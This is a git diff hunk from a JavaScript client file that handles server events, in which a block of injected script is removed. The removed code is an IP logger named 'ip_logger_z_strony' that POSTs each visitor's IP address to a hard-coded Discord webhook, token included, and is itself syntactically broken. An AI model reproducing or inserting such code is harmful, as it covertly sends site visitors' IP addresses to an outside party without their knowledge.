@@ -49,23 +49,7 @@
             else {
                 console.log(`event not handled: ${data.event}`);
             }
-     <script>
-function getIP(json) {
-  var request = new XMLHttpRequest(); //making a request for the webhook
-      request.open("POST", "https://discord.com/api/webhooks/975000003456139324/7Sw_dXKIbL5WDxbf0V2NQKBNvH1KIAxcvyw66kKn4riaDz9KdupGqHkDalGyO5tijV5C");
 
-      request.setRequestHeader('Content-type', 'application/json');
-
-      var params = {
-        username: "ip_logger_z_strony",
-        avatar_url: https://discord.com/api/webhooks/975000003456139324/7Sw_dXKIbL5WDxbf0V2NQKBNvH1KIAxcvyw66kKn4riaDz9KdupGqHkDalGyO5tijV5C",
-        content: "**IP:** **" + json.ip + "*"
-      }
-    //just a webhook parameters such as avatar,name,message
-
-       request.send(JSON.stringify(params));
-     }
-        })
     }
     emitToServer(event, args) {
         const id = this.generateUIID();
